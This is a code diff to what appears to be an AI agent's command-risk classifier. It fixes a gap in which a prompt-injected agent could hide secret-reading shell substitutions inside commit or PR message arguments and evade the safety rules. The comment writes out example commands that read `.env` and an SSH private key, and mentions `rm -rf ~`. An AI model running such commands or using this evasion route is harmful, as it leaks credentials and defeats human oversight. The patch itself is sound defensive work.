@@ -80,12 +80,33 @@ export function normalizeSemanticAction(action: ToolAction): SemanticAction {
  *  action) and deliberately does NOT touch normalizeSemanticAction, so the
  *  authorization identity (actionHash) is unchanged. The command's actual
  *  file arguments and verbs are untouched, so a real secret-file read or
- *  protocol-surface write still classifies critical. */
+ *  protocol-surface write still classifies critical.
+ *
+ *  EXCEPTION (the prompt-injected-builder threat model): a value is only
+ *  stripped when it is inert prose. A value carrying a shell command
+ *  substitution or expansion — `$(...)`, a backtick, or `${...}` — is NOT
+ *  prose: the shell executes/expands it, so `git commit -m "$(cat .env)"`
+ *  reads .env and `gh pr create --body "$(cat ~/.ssh/id_rsa)"` reads a private
+ *  key at commit/PR time. Stripping those blinded the classifier and turned a
+ *  CRITICAL exfil into a ROUTINE op. Such a value is left in place so the
+ *  embedded command text still reaches the rules — the `.env`/`id_rsa` read
+ *  trips secrets-or-auth, an `rm -rf ~` trips destructive-or-irreversible, a
+ *  `curl` trips outbound-network. */
 function withoutMessageArgs(command: string): string {
   return command.replace(
     /(?:^|\s)(?:--body|--message|--subject|--description|--notes|--title|-m)(?:=|\s+)("(?:[^"\\]|\\.)*"|'[^']*'|\S+)/gi,
-    " ",
+    (match: string, value: string) => (hasExecutableEffect(value) ? match : " "),
   );
+}
+
+/** True when a message VALUE contains a shell construct the shell would run or
+ *  expand rather than treat as literal text: command substitution `$(...)`, a
+ *  backtick, or parameter/`${IFS}`-style expansion `${...}`. Checked on the raw
+ *  value regardless of the surrounding quote style — an inert single-quoted
+ *  `$(...)` costs at most one human tap if kept, whereas reasoning about shell
+ *  quoting to save that tap would risk a false negative (fail closed). */
+function hasExecutableEffect(value: string): boolean {
+  return value.includes("$(") || value.includes("`") || value.includes("${");
 }
 
 function classificationCommand(semantic: SemanticAction): string {
